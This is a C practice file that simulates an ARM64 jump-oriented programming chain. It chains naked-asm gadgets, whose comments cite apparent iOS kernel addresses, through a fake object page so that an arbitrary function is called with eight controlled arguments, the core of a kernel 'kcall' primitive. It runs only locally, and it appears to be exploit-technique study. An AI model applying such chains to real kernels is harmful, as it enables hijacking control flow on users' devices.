#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

void *my_page = NULL;

uint64_t func_arg8(uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {

    printf("a1 = 0x%llx, a2 = 0x%llx, a3 = 0x%llx, a4 = 0x%llx, a5 = 0x%llx, a6 = 0x%llx, a7 = 0x%llx, a8 = 0x%llx\n", \
        a1, a2, a3, a4, a5, a6, a7, a8);

    return 0xCAFEBABE41424344;
}

//FFFFFFF0085DEE04
__attribute__((naked)) uint64_t gadget_populate(uint64_t *x0) {
    __asm__ volatile (
        "ldp x4, x0, [x1] \n"
        "ldp x8, x2, [x1, #0x10] \n" 
        "ldr x3, [x1, #0x20] \n" 
        "mov x1, x8 \n"
        "br x4 \n"
    );
}

//FFFFFFF008950124
__attribute__((naked)) uint64_t gadget_prologue(uint64_t *x0) {
    __asm__ volatile (
        "stp x20, x19, [sp, #-0x20]!\n" 
        "stp x29, x30, [sp, #0x10]\n" 
        "add x29, sp, #0x10\n"        
        "mov x19, x1\n"                
        "ldr x0, [x0, #0x98]\n"          
        "ldr x8, [x0]\n"               
        "ldr x8, [x8, #0x7C0]\n"      
        "blr x8\n"                    
        "str x0, [x19]\n"             
        "mov w0, #0\n"               
        "ldp x29, x30, [sp, #0x10]\n"   
        "ldp x20, x19, [sp], #0x20\n"   
        "ret\n"
    );
}

//FFFFFFF0087BD4F4
__attribute__((naked)) void mov_x15_x2__br_x3(void) {
    __asm__ volatile (
        "mov x15, x2\n"
        "br x3\n"
    );
}

//FFFFFFF00874CF28
__attribute__((naked)) void mov_x9_x15__br_x16(void) {
    __asm__ volatile (
        "mov x9, x15\n"
        "br x16\n"
    );
}

//
__attribute__((naked)) void mov_x16_x2__br_x3(void) {
    __asm__ volatile (
        "mov x16, x2\n"
        "br x3\n"
    );
}

//
__attribute__((naked)) void mov_x14_x2__br_x3(void) {
    __asm__ volatile (
        "mov x14, x2\n"
        "br x3\n"
    );
}

//
__attribute__((naked)) void mov_x1_x2__br_x3(void) {
    __asm__ volatile (
        "mov x1, x2\n"
        "br x3\n"
    );
}

//
__attribute__((naked)) void mov_x10_x14__br_x16(void) {
    __asm__ volatile (
        "mov x10, x14\n"
        "br x16\n"
    );
}

//
__attribute__((naked)) void mov_x7_x8__br_x10(void) {
    __asm__ volatile (
        "mov x7, x8\n"
        "br x10\n"
    );
}

//
__attribute__((naked)) void mov_x1_x9__br_x13(void) {
    __asm__ volatile (
        "mov x1, x9\n"
        "br x13\n"
    );
}

//
__attribute__((naked)) void mov_x13_x14__br_x16(void) {
    __asm__ volatile (
        "mov x13, x14\n"
        "br x16\n"
    );
}

//
__attribute__((naked)) void mov_x4_x8__br_x10(void) {
    __asm__ volatile (
        "mov x4, x8\n"
        "br x10\n"
    );
}

int writebuf(uint64_t addr, const void* input, size_t size) {
    memcpy((void*)addr, input, size); 
    return 0;
}

int write64(uint64_t a, uint64_t v) {
    return writebuf(a, &v, sizeof(v));
}

int write32(uint64_t a, uint32_t v) {
    return writebuf(a, &v, sizeof(v));
}

int readbuf(uint64_t addr, void* output, size_t size) {
    memcpy((void*)output, addr, size);

    return 0;
}

uint64_t read64(uint64_t a) {
    uint64_t value = 0;
    readbuf(a, &value, sizeof(value));
    return value;
}

uint32_t read32(uint64_t a) {
    uint32_t value = 0;
    readbuf(a, &value, sizeof(value));
    return value;
}

void hexdump(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        if ((i % 16) == 0)
        {
            printf("[0x%016llx+0x%03zx] ", (long long unsigned int)&data, i);
        }

        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        }
        else
            ascii[i % 16] = '.';

        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0)
                printf("|  %s \n", ascii);
            else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j)
                    printf("   ");

                printf("|  %s \n", ascii);
            }
        }
    }
}


uint32_t my_call6(uint64_t addr, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7) {
    uint32_t ret = 0;

    //TODO: call func_arg8 using addr
    uint64_t (*func)(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t) = 
        (uint64_t (*)(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t)) addr;

    ret = (uint32_t)func(a1, a2, a3, a4, a5, a6, a7, 0);

    return ret;
}

uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7) {
    write64(my_page, my_page);
    write64(my_page + 0x98, my_page);
    write64(my_page + 0x7c0, gadget_populate + 4);

    //gadget_populate + 4 함수에서 진입했을때, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은 my_call6의 a5 참조 (a5 = mov_x16_x2__br_x3)
    write64(my_page + 0x100, 0);
    write64(my_page + 0x108, 0);
    write64(my_page + 0x110, my_page + 0x800);  //x1 = x8
    write64(my_page + 0x118, gadget_populate);  //x2
    write64(my_page + 0x120, gadget_populate);  //x3

    //mov_x16_x2__br_x3 실행했을 때, 
    //이제 x16 = x2 (gadget_populate), //(P1)
    //x3에 의해 gadget_populate로 분기;

    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은 mov_x15_x2__br_x3으로 분기
    write64(my_page + 0x800, mov_x15_x2__br_x3);    //x4
    write64(my_page + 0x808, 0);                    //
    write64(my_page + 0x810, my_page + 0x840);      //x1 = x8
    write64(my_page + 0x818, x1);                   //x2
    write64(my_page + 0x820, mov_x9_x15__br_x16);   //x3

    //mov_x15_x2__br_x3
    //이제 x15 = x2 (call8_jop's x1)
    //x3에 의해 mov_x9_x15__br_x16으로 분기;

    //mov_x9_x15__br_x16으로
    //이제 x9 = x15 (call8_jop's x1)    //(P7)
    //x16(P1)에 의해 gadget_populate으로 분기;

    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은 mov_x16_x2__br_x3으로 분기
    write64(my_page + 0x840, mov_x16_x2__br_x3);    //x4
    write64(my_page + 0x848, 0);                    //
    write64(my_page + 0x850, my_page + 0x880);      //x1 = x8
    write64(my_page + 0x858, gadget_populate);      //x2
    write64(my_page + 0x860, gadget_populate);      //x3

    //mov_x16_x2__br_x3
    //이제 x16 = x2 (gadget_populate)   //(P2)
    //x3에 의해 gadget_populate으로 분기;

    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은 mov_x14_x2__br_x3으로 분기
    write64(my_page + 0x880, mov_x14_x2__br_x3);    //x4
    write64(my_page + 0x888, 0);                    //
    write64(my_page + 0x890, my_page + 0x8c0);      //x1 = x8
    write64(my_page + 0x898, mov_x1_x2__br_x3);     //x2    //(P3)
    write64(my_page + 0x8a0, mov_x10_x14__br_x16);  //x3

    //mov_x14_x2__br_x3
    //이제 x14 = x2 (mov_x1_x2__br_x3) //(P3)
    //x3에 의해 mov_x10_x14__br_x16으로 분기;

    //mov_x10_x14__br_x16
    //이제 x10 = x14 (mov_x1_x2__br_x3) //(P3)
    //x16(P2)에 의해 gadget_populate으로 분기;

    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은 mov_x7_x8__br_x10으로 분기
    write64(my_page + 0x8c0, mov_x7_x8__br_x10);    //x4
    write64(my_page + 0x8c8, 0);                    //
    write64(my_page + 0x8d0, x7);                   //x1 = x8
    write64(my_page + 0x8d8, my_page + 0x900);      //x2
    write64(my_page + 0x8e0, gadget_populate);      //x3

    //mov_x7_x8__br_x10
    //이제 x7 = x8 (call8_jop's x7)
    //x10(P3)에 의해 mov_x1_x2__br_x3으로 분기;

    //mov_x1_x2__br_x3
    //이제 x1 = x2 (my_page + 0x900)
    //x3에 의해 gadget_populate으로 분기;

    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은 mov_x16_x2__br_x3으로 분기
    write64(my_page + 0x900, mov_x16_x2__br_x3);    //x4
    write64(my_page + 0x908, 0);                    //
    write64(my_page + 0x910, my_page + 0x940);      //x1 = x8
    write64(my_page + 0x918, gadget_populate);      //x2
    write64(my_page + 0x920, gadget_populate);      //x3

    //mov_x16_x2__br_x3
    //이제 x16 = x2 (gadget_populate)   //(P4)
    //x3에 의해 gadget_populate으로 분기;

    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은mov_x14_x2__br_x3으로 분기
    write64(my_page + 0x940, mov_x14_x2__br_x3);    //x4
    write64(my_page + 0x948, 0);                    //
    write64(my_page + 0x950, my_page + 0x980);      //x1 = x8
    write64(my_page + 0x958, mov_x1_x9__br_x13);    //x2
    write64(my_page + 0x960, mov_x10_x14__br_x16);  //x3

    //mov_x14_x2__br_x3
    //이제 x14 = x2 (mov_x1_x9__br_x13)
    //x3에 의해 mov_x10_x14__br_x16으로 분기

    //mov_x10_x14__br_x16
    //이제 x10 = x14 (mov_x1_x9__br_x13)    //(P6)
    //x16(P4)에 의해 gadget_populate으로 분기;

    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은 mov_x16_x2__br_x3으로 분기
    write64(my_page + 0x980, mov_x16_x2__br_x3);    //x4
    write64(my_page + 0x988, 0);                    //
    write64(my_page + 0x990, my_page + 0x9C0);      //x1 = x8
    write64(my_page + 0x998, gadget_populate);      //x2
    write64(my_page + 0x9A0, gadget_populate);      //x3

    //mov_x16_x2__br_x3
    //이제 x16 = x2 (gadget_populate)   //(P5)
    //x3에 의해 gadget_populate으로 분기;

    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은 mov_x14_x2__br_x3으로 분기
    write64(my_page + 0x9C0, mov_x14_x2__br_x3);    //x4
    write64(my_page + 0x9C8, 0);                    //
    write64(my_page + 0x9D0, my_page + 0xA00);      //x1 = x8
    write64(my_page + 0x9D8, addr);                 //x2
    write64(my_page + 0x9E0, mov_x13_x14__br_x16);  //x3

    //mov_x14_x2__br_x3
    //이제 x14 = x2 (addr)
    //x3에 의해 mov_x13_x14__br_x16으로 분기;

    //mov_x13_x14__br_x16
    //이제 x13 = x14 (addr) //(P8)
    //x16(P5)에 의해 gadget_populate으로 분기;

    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은 mov_x4_x8__br_x10으로 분기
    write64(my_page + 0xA00, mov_x4_x8__br_x10);    //x4
    write64(my_page + 0xA08, x0);                   //x0
    write64(my_page + 0xA10, x4);                   //x1 = x8
    write64(my_page + 0xA18, x2);                   //x2
    write64(my_page + 0xA20, x3);                   //x3

    //mov_x4_x8__br_x10
    //이제 x4 = x8 (call8_jop's x4)
    //x10에 의해 mov_x1_x9__br_x13으로 분기;

    //mov_x1_x9__br_x13
    //이제 x1 = x9 (call8_jop's x1 (P7))
    //x13(P8)에 의해 addr로 분기

    uint64_t STORED_RET = my_page + 0x100;
    uint64_t ret2 = my_call6(gadget_prologue, my_page, STORED_RET, 0, 0, mov_x16_x2__br_x3, x5, x6);

    // hexdump(my_page, 0x1000);

    uint64_t ret = read64(STORED_RET);

    return ret;
}


int main(int argc, char *argv[], char *envp[]) {
#if 0 
    printf("jop_practice\n");

    uint64_t ret = func_arg8(0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48);
    printf("func_arg8 ret = 0x%llx\n", ret);

    my_call6(func_arg8, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47);
#endif

    my_page = malloc(0x1000);
    memset(my_page, 0x0, 0x1000);
    printf("my_page = %p\n", my_page);


    uint64_t ret = call8_jop(func_arg8, 0xdeadbeef41424340, 0xdeadbeef41424341, 0xdeadbeef41424342, 0xdeadbeef41424343, 0xdeadbeef41424344, 0xdeadbeef41424345, 0xdeadbeef41424346, 0xdeadbeef41424347);
    printf("call8_jop ret = 0x%llx\n", ret);

    return 0;
}